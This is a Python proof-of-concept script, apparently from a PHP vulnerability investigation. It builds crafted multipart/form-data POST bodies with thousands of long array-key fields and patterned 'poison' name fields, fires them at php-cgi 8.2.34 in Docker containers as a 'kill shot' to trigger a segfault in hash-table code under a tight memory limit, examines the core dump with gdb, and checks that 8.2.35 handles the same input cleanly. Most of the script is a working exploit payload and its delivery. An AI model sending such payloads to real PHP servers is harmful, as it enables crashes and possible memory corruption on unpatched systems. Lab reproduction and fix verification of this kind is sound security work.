#!/usr/bin/env python3
"""oom46: THE DECISIVE MATRIX (all transports correct, -i everywhere).
A) rebuild instrument (4 banner fixes) in phpbuild
B) tiny-body sanity on instrumented 8.2.34 (POSTCOUNT=5, rc=0)
C) native kill shot -> RC + trace tail
D) core dump -> gdb command-file forensics (true crash site)
E) 8.2.35 fixed: tiny sanity (expect 5) + attack @64M (expect full count,
   rc 0) + attack @20600000 (expect clean fatal, NO segv)
"""
import subprocess
import time

NAMELEN = 3064
BIN34 = "/usr/src/php-8.2.34/sapi/cgi/php-cgi"
BIN35 = "/usr/src/php-8.2.35/sapi/cgi/php-cgi"


def dx(cid, cmd, inp=None, timeout=590):
    args = ["docker", "exec"]
    if inp is not None:
        args.append("-i")
    args += [cid, "sh", "-c", cmd]
    r = subprocess.run(args, input=inp, capture_output=True, timeout=timeout)
    return r.returncode, r.stdout.decode("latin1")


def key_part(i):
    head = (b'--BOUND\r\nContent-Disposition: form-data; name="p' + b"K" * (NAMELEN - 8) +
            (b"%d" % i) + b'[x]"\r\n\r\n')
    return head + b"v\r\n"


def poison_part(n, poison):
    cell = bytes([8, 8, 8, 8, 8, 8, 8, 8, 8, 1, 8, 8, 8, 8, 8, 8])
    nm = b"q" + cell * ((poison - 10) // 16) + (b"%06d" % n)
    return b'--BOUND\r\nContent-Disposition: form-data; name="' + nm + b'"\r\n\r\nv\r\n'


def build_attack(k1=2044, prep=3, poison=163840):
    ps = [key_part(i) for i in range(k1)]
    ps += [poison_part(n, poison) for n in range(prep)]
    ps += [key_part(i) for i in range(k1, 4200)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def build_tiny():
    ps = [b'--BOUND\r\nContent-Disposition: form-data; name="k%d"\r\n\r\nval%d\r\n' % (i, i)
          for i in range(5)]
    ps.append(b"--BOUND--\r\n")
    return b"".join(ps)


def run_cgi(cid, binpath, body, lim, extra=""):
    fn = "/tmp/b_%d.bin" % int(time.time() * 1000 % 1000000)
    dx(cid, "cat > " + fn, inp=body, timeout=120)
    cmd = ("REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
           "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
           "%s -d memory_limit=%s -d post_max_size=4096M -d max_input_vars=100000 %s "
           "<%s >/tmp/o.log 2>/tmp/e.log; echo RC=$?") % (len(body), binpath, lim, extra, fn)
    rc, out = dx(cid, cmd)
    _, tail = dx(cid, "tail -c 400 /tmp/o.log; echo ---; tail -4 /tmp/e.log")
    return out.strip(), tail.strip()


if __name__ == "__main__":
    print("=== A) rebuild instrument ===", flush=True)
    _, _ = dx("phpbuild", "cp /usr/src/php-8.2.34/Zend/zend_hash.c /usr/src/php-8.2.34/Zend/zend_hash.c.bak4")
    rc, _ = subprocess.run(["docker", "cp", "/tmp/phplab/instr/zend_hash.c",
                            "phpbuild:/usr/src/php-8.2.34/Zend/zend_hash.c"]).returncode, None
    _, o = dx("phpbuild", "touch /usr/src/php-8.2.34/Zend/zend_hash.c "
              "&& cd /usr/src/php-8.2.34 && make -j4 2>&1 | tail -3")
    print(o)

    print("=== B) tiny sanity on 8.2.34 instrumented ===", flush=True)
    print(run_cgi("phpbuild", BIN34, build_tiny(), "64000000"), flush=True)

    print("=== C) native kill shot ===", flush=True)
    att = build_attack()
    rc_out, tail = run_cgi("phpbuild", BIN34, att, "20600000")
    print("rc:", rc_out)
    print("trace tail:", tail[-500:], flush=True)

    print("=== D) core forensics ===", flush=True)
    dx("phpbuild", "rm -f /tmp/core*")
    dx("phpbuild", "cat > /tmp/att.bin", inp=att, timeout=120)
    _, o = dx("phpbuild", "cd /tmp && ulimit -c unlimited && "
              "REQUEST_METHOD=POST CONTENT_TYPE='multipart/form-data; boundary=BOUND' "
              "CONTENT_LENGTH=%d REDIRECT_STATUS=200 SCRIPT_FILENAME=/tmp/t_probe.php "
              "%s -d memory_limit=20600000 -d post_max_size=4096M -d max_input_vars=100000 "
              "</tmp/att.bin >/tmp/o.log 2>/tmp/e.log; echo RC=$?; ls -la /tmp/core* 2>/dev/null"
              % (len(att), BIN34))
    print(o)
    dx("phpbuild", "printf 'set pagination off\\nframe 0\\nx/4i $pc\\ninfo registers rdi rsi rax rbx\\nbt 12\\nframe 4\\ninfo locals\\n' > /tmp/g.gdb")
    _, bt = dx("phpbuild", "gdb -q -batch -x /tmp/g.gdb %s /tmp/core* 2>&1 | tail -32" % BIN34)
    print(bt, flush=True)

    print("=== E) 8.2.35 fixed ===", flush=True)
    dx("phpbuild35", "printf '<?php header(\"Content-Type: text/plain\"); echo \"POSTCOUNT=\".count($_POST);' > /tmp/t_probe.php")
    print("tiny:", run_cgi("phpbuild35", BIN35, build_tiny(), "64000000")[0], flush=True)
    r1, t1 = run_cgi("phpbuild35", BIN35, att, "64000000")
    print("attack@64M:", r1, "| out tail:", t1[-200:], flush=True)
    r2, t2 = run_cgi("phpbuild35", BIN35, att, "20600000")
    print("attack@20.6M:", r2, "| out tail:", t2[-250:], flush=True)
